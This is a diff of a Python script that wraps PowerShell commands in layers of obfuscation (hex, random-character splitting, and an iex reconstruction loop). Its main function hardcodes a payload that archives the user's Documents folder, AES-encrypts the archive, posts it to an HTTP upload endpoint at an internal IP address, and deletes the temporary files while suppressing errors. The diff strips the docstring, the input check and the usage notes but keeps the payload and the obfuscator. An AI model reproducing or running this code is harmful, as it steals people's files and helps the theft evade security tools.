@@ -3,15 +3,6 @@ import base64
 import random
 import string
 
-def obfuscate_powershell(command):
-    """
-    Obfuscates a PowerShell command with multiple layers:
-    1. Hex encoding
-    2. Split hex digits with random characters + reconstruction loop
-    3. Base64 encoding
-    4. Reverse the base64
-    5. XOR encryption with random key
-    """
     
 def obfuscate_powershell(command):
     import itertools
@@ -35,7 +26,7 @@ def obfuscate_powershell(command):
 
     obfuscated_string = ''.join(grouped)
 
-    # PowerShell reconstruction logic (same pattern: 1, 2, 3)
+    # PowerShell reconstruction logic 
     reconstruction_ps = (
         f"""$s='{obfuscated_string}';$r='';$i=0;$p=0;while($i-lt$s.Length){{$t=@(1,2,3)[$p%3];$c=[Math]::Min($t,$s.Length-$i);if($c-gt0){{$r+=$s.Substring($i,$c);$i+=$c}};$i+=[Math]::Min(1,$s.Length-$i);$p++}};$h=$r;if($h.Length%2-ne0){{$h=$h.Substring(0,$h.Length-1)}};[System.Text.Encoding]::ASCII.GetString(@(for($j=0;$j-lt$h.Length;$j+=2){{[Convert]::ToByte($h.Substring($j,2),16)}}))|iex"""
     )
@@ -82,12 +73,8 @@ iex $rd
 
 
 def main():
-    # Get PowerShell command from user
     ps_command = """$AAAAAAAAAAAAAABBBBBIIIiiAB='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&()_+-=[]{}~';$aadsfjkh=-join((1..15)|ForEach{$AAAAAAAAAAAAAABBBBBIIIiiAB[(Get-Random -Maximum $AAAAAAAAAAAAAABBBBBIIIiiAB.Length)]});$fnsdadkj="$env:TEMP\$aadsfjkh.zip";$cvmz="$env:TEMP\$aadsfjkh.enc";try{Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -File|Where-Object{-not $_.PSIsContainer -and $_.Name -notlike "*transcript*" -and $_.Name -notlike "*.tmp"}|Compress-Archive -DestinationPath $fnsdadkj -CompressionLevel Fastest -ErrorAction SilentlyContinue;if(Test-Path $fnsdadkj){$pqoero=New-Object byte[] 16;$dma=New-Object byte[] 16;$zfsfdm=[System.Security.Cryptography.RNGCryptoServiceProvider]::Create();$zfsfdm.GetBytes($pqoero);$zfsfdm.GetBytes($dma);$zfsfdm.Dispose();$dmafnaas=[System.Security.Cryptography.Aes]::Create();$dmafnaas.Key=$pqoero;$dmafnaas.IV=$dma;$encryptor=$dmafnaas.CreateEncryptor();$dfnalkns=[System.IO.File]::ReadAllBytes($fnsdadkj);$agbaghb=$encryptor.TransformFinalBlock($dfnalkns,0,$dfnalkns.Length);$dmafnaas.Dispose();$combinedBytes=$pqoero+$agbaghb+$dma;[System.IO.File]::WriteAllBytes($cvmz,$combinedBytes);Remove-Item $fnsdadkj -Force -ErrorAction SilentlyContinue;iwr -Uri "http://192.168.18.76:8080/upload" -Method Post -InFile $cvmz -ContentType "application/octet-stream" -Headers @{"X-Filename"=(Split-Path $cvmz -Leaf)} -ErrorAction SilentlyContinue|Out-Null;if(Test-Path $cvmz){Remove-Item $cvmz -Force -ErrorAction SilentlyContinue}}}catch{} """
     
-    if not ps_command.strip():
-        print("Error: Please provide a PowerShell command")
-        return
     try:
         cmdline_cmd, ps1_cmd, layers = obfuscate_powershell(ps_command)
         
@@ -98,12 +85,6 @@ def main():
         print("-" * 20)
         print(ps1_cmd)
         print("="*60)
-        
-        # Show how to use both versions
-        print(f"\nUsage:")
-        print(f"Command line: Copy and paste the command line version into cmd/terminal")
-        print(f"PS1 file: Save the PS1 version to a .ps1 file and run with 'powershell -ExecutionPolicy Bypass -File script.ps1'")
-        print(f"\nBoth will execute: {ps_command}")
         
     except Exception as e:
         print(f"Error during obfuscation: {e}")
